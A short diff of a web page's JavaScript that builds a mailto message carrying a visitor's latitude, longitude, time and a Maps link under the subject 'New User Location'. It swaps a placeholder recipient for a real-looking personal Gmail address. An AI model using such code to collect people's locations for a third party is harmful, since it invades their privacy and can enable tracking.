@@ -55,7 +55,7 @@
             document.getElementById("result").innerHTML = result;
 
             // Send to email
-            const email = "your-email@example.com"; // Replace with your email
+            const email = "misofiko3@gmail.com"; // Replace with your email
             const subject = "New User Location";
             const body = `Latitude: ${latitude}\nLongitude: ${longitude}\nTime: ${new Date().toLocaleString()}\nGoogle Maps Link: https://www.google.com/maps?q=${latitude},${longitude}`;
             window.location.href = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
